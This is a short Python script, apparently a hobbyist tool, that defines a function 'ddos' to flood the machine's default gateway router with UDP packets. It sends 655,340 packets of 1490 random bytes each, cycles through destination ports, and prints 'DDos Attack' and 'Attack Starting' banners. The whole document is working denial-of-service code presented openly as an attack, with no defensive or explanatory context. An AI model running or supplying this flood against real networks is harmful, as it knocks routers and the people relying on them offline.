def ddos(num_packets=655340):
    import netifaces
    import sys
    import os
    import time
    import socket
    import random

    ##############
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    #############

    os.system("clear")
    os.system("figlet DDos Attack")
    ip = router_ip = netifaces.gateways()['default'][2][0]
    port = 1

    os.system("clear")
    os.system("figlet Attack Starting")
    time.sleep(3)
    sent = 0
    while sent < num_packets:
        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        port = port + 1
        if port == 65534:
            port = 1